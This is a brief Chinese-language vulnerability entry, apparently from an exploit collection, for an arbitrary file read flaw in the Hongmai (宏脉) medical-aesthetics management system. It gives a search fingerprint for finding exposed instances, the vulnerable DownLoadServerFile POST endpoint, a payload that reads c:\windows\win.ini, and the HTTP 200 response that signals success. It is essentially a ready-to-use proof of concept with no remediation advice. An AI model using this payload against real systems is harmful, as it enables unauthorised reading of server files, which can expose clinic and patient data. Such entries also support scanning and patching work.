# 宏脉医美行业管理系统DownLoadServerFile存在任意文件读取漏洞

宏脉医美行业管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="宏脉医美行业管理系统"`
- **请求**：`POST /zh-CN/PublicInterface/DownLoadServerFile HTTP/1.1`

**Payload**
```
filePath=c:\\windows\win.ini
```
- **响应特征**：200